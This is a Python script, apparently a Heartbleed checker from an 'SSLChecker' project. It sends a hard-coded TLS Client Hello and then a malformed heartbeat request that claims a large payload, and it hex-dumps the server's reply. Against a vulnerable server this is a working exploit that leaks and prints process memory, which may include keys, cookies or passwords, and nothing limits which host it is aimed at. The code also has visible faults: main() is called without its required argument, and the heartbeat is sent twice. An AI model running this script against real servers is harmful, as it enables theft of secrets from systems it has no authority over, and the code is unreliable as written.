"""
#Author: Renato Vieira - Version 2.0
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE  See the
# GNU General Public License for more details. http://www.gnu.org/licenses/.
Requirements:
Python 3.4.0 - Python.org
TLSFuzzer - https://github.com/tomato42/tlsfuzzer
tlslite-ng - https://github.com/tomato42/tlslite-ng
ECDSA - https://github.com/warner/python-ecdsa
More information at:
https://sslvulnerabilitychecker.com
https://github.com/vieira22/SSLChecker
"""

import sys
import select
import struct
import codecs
import time
import socket


decode_hex = codecs.getdecoder('hex_codec')


def h2bin(x):
    return decode_hex(x.replace(' ', '').replace('\n', ''))[0]


hello = h2bin('''
        16 03 02 00  dc 01 00 00 d8 03 02 53
        43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
        bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
        00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
        00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
        c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
        c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
        c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
        c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
        00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
        03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
        00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
        00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
        00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
        00 0f 00 01 01                                  
        ''')

hb = h2bin(''' 
        18 03 02 00 03
        01 40 00
        ''')


def hex(s):
    for b in range(0, len(s), 16):
        lin = [c for c in s[b: b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join(chr(c) if 32 <= c <= 126 else '.' for c in lin)
        print('  %04x: %-48s %s' % (b, hxdat, pdat))
    print()


def recvall(s, length, timeout=5):
    try:
        endtime = time.time() + timeout
        rdata = b''
        remain = length

        while remain > 0:
            rtime = endtime - time.time()
            if rtime < 0:
                return None
            r, w, e = select.select([s], [], [], 5)
            if s in r:
                data = s.recv(remain)
                # EOF?
                if not data:
                  return None
                rdata += data
                remain -= len(data)

        return rdata
    except Exception as e:
        print(e)
        pass

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    print(' ... received: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay


def hit(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            # print('No heartbeat received, server very likely not vulnerable')
            print('Server very likely not vulnerable')
            return False

        if typ == 24:
            print('Received heartbeat response:')
            hex(pay)
            if len(pay) > 3:
                print('WARNING - server returned more data than it should - server very likely vulnerable!')
            else:
                print('Server processed malformed heartbeat, but did not return any extra data.')
            return True

        if typ == 21:
            print('Received alert:')
            hex(pay)
            # print('Server returned error, likely not vulnerable')
            print('Server likely not vulnerable')
            return False


def main(url):
    # opts, args = options.parse_args()
    # if len(args) < 1:
    #     options.print_help()
    #     return

    args = [url]
    opts = {'starttls': False, 'debug': False, 'port': 443}  # opts are: debug(True/False), port(port number), starttls(True, False)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Connecting...')
    sys.stdout.flush()
    # s.connect((args[0], opts.port))
    try:
        s.connect((args[0], opts['port']))
    except Exception as e:
        print(e)
        return

    if opts['starttls']:
        re = s.recv(4096)
        if opts['debug']: print(re)
        s.send(b'ehlo starttlstest\n')
        re = s.recv(1024)
        if opts['debug']: print(re)
        if not b'STARTTLS' in re:
            if opts['debug']: print(re)
            print('STARTTLS not supported...')
            sys.exit(0)
        s.send(b'starttls\n')
        re = s.recv(1024)

    print('Sending Client Hello...')
    sys.stdout.flush()
    s.send(hello)
    print('Waiting for Server Hello...')
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print('Server closed connection without sending Server Hello.')
            return
        # Look for server hello done message.
        if typ == 22 and pay[0] == 0x0E:
            break

    print('Sending heartbeat request...')
    sys.stdout.flush()
    s.send(hb)
    hit(s)


if __name__ == '__main__':
    main()
